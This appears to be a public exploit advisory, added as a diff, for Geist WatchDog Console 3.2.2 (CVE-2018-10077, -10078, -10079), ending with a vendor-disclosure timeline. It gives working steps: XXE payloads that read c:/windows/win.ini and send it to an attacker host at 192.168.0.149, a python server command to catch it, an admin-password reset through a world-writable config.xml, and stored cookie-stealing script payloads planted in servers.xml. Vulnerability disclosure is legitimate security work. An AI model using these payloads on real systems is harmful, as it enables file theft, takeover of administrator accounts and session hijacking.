@@ -1,0 +1,97 @@
+# Exploit Author: bzyo
+# CVE: CVE-2018-10077, CVE-2018-10078, CVE-2018-10079
+# Twitter: @bzyo_
+# Exploit Title: Geist WatchDog Console 3.2.2 -  Multiple Vulnerabilities
+# Date: 04-17-18
+# Vulnerable Software: WatchDog Console - 3.2.2
+# Vendor Homepage: http://www.itwatchdogs.com/
+# Version: 3.2.2
+# Software Link: http://www.itwatchdogs.com/userfiles/file/firmware/Console/WatchDogConsoleInstaller_v3.2.2.exe
+# Tested On: Windows 7 x86
+ 
+Description
+-----------------------------------------------------------------
+WatchDog Console suffers from multiple vulnerabilities:
+
+# CVE-2018-10077 Authenticated XML External Entity (XXE)
+# CVE-2018-10078 Authenticated Stored Cross Site Scripting (XSS)
+# CVE-2018-10079 Insecure File Permissions
+
+Prerequisites
+-----------------------------------------------------------------
+To successfully exploit these vulnerabilities, an attacker must already have access 
+to a system running WatchDog Console using a low-privileged user account
+
+Proof of Concepts
+-----------------------------------------------------------------
+### CVE-2018-10079 Insecure File Permissions ###
+By default, WatchDog Console 3.2.2 installs all configuration data at 'C:\ProgramData\WatchDog Console' and 
+gives 'Authenticated Users' group Modify permissions
+ 
+C:\>icacls "c:\ProgramData\WatchDog Console"
+c:\ProgramData\WatchDog Console NT AUTHORITY\Authenticated Users:(OI)(CI)(M,DC)
+
+This allows any local user of the system the ability to reset the application admin password by generating 
+a password using the PHP md5() function and updating the config.xml file.  It also provides the ability to 
+add data to servers.xml for both CVE-2018-10078 and CVE-2018-10079 or through the application interface
+
+### CVE-2018-10077 Authenticated XML External Entity (XXE) ###
+With authenticated admin access to the application or local access to the system, a user has the ability to read 
+system files remotely through XXE
+
+On attacking machine
+- Create data.xml with following contents in apache root and start apache listening on 80
+	<?xml version="1.0" encoding="utf-8"?>
+	<!DOCTYPE r [
+	<!ELEMENT r ANY >
+	<!ENTITY % sp SYSTEM "http://192.168.0.149:8080/evil.xml">
+	%sp;
+	%param1;
+	]>
+	<r>&exfil;</r>
+
+- Create evil.xml with the following contents anywhere
+	<?xml version="1.0" encoding="UTF-8"?>
+	<!ENTITY % data SYSTEM "file:///c:/windows/win.ini">
+	<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://192.168.0.149:8080/?%data;'>">
+	
+- Start python simple http server in same directory as evil.xml, listening on 8080
+	python -m SimpleHTTPServer 8080
+	
+On victim machine (1 of 2 ways)
+1. With admin access to application console, add attacking server IP address under servers tab
+or
+2. With local access to system
+	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following:
+		<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+		<servers>
+		<server host="192.168.0.149" addrType="http" port="80" description="" selEmail="True" Username="1" Password="1" left="700" top="420" />
+		</servers>
+	- restart system
+
+On attacking machine
+- Contents of 'win.ini' is outputted to console
+- evil.xml can be updated to read other sensitive files (tested reading file from admin desktop)
+
+### CVE-2018-10078 Authenticated Stored Cross Site Scripting (XSS) ###
+This application suffers from authenticated XSS on several inputs (1 of 2 ways)
+1. With admin access to application console, under servers tab
+	- add dummy IP in server name filed
+	- add <script>alert(document.cookie)</script>"> into server description
+or	
+2. With local access to system
+	- update 'C:\ProgramData\WatchDog Console\servers.xml file' with following:
+		<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+		<servers>
+		<server host="172.16.1.1" addrType="http" port="80" description="<script>alert(document.cookie)</script>">" selEmail="True" Username="1" Password="1" left="400" top="180" />
+		</servers>
+	- restart system
+
+3. popup with cookie appears when browsing from Overview, Dashboard, and Server tabs.  Remains after reboot.
+
+Timeline
+---------------------------------------------------------------------
+04-14-18: Vendor notified of vulnerabilities
+04-16-18: Vendor responded "Thank you for bringing this to our attention. The product has now been End-of-life for 
+several years and is no longer receiving updates."
+04-17-18: Submitted public disclosure
